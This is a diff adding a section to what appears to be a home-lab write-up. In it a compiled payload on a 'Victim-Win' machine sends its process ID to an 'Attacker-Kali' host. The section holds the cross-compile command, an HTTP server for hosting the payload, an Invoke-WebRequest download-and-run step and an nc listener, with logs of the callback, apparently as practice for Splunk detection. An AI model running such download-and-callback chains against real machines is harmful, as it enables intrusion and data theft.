@@ -353,3 +353,47 @@ After that I tried spamming the command `python3 -c "print('A' * 10)" | nc 192.1
 <img title="nc spam" alt="Image here" src="/images/nc_spam.png">
 
 After a quick google search I found that there are no known exploits but it can be misidentified as a `Pando Media Booster`.
+
+### Getting PID
+
+Inside of `scripts`, I have a file called `payload.c` this program sends the PID to `Attacker-Kali` when run.
+#### Attacker-Kali Commands
+To run this you have to compile it with `x86_64-w64-mingw32-gcc pid_sender.c -o pid_sender.exe -lwininet`, we use the cross-compiler for Windows 64-bit systems.
+After that we can start a simple HTTP Server with this command `python3 -m http.server 80`. In another terminal run a listener by using this command `nc -lvnp 9000`.
+
+#### Victim-Win Commands
+
+Open Powershell and run:
+```ps1
+Invoke-WebRequest -Uri http://192.168.56.30/pid_sender.exe -OutFile pid_sender.exe
+```
+or just open your browser and search `http://192.168.56.30/pid_sender.exe`.
+Just run `.\pid_sender.exe`.
+
+Now you should see in your Attacker-Kali machine:
+```bash
+┌──(kali㉿kali)-[~/payload-host]
+└─$ python3 -m http.server 80
+
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) .
+192.168.56.20 - - [28/Jul/2025 14:58:09] "GET /pid_sender.exe HTTP/1.1" 200 -
+```
+and in the terminal with the listener:
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9000
+
+listening on [any] 9000 ...
+connect to [192.168.56.30] from (UNKNOWN) [192.168.56.20] 56236
+GET / HTTP/1.1
+User-Agent: MyBOF
+Host: 192.168.56.30:9000
+Cache-Control: no-cache
+```
+
+And in Splunk we see this !.. :
+
+I will add screenshots here
+pid_sender.png
+dataset_1.png
+dataset_2.png
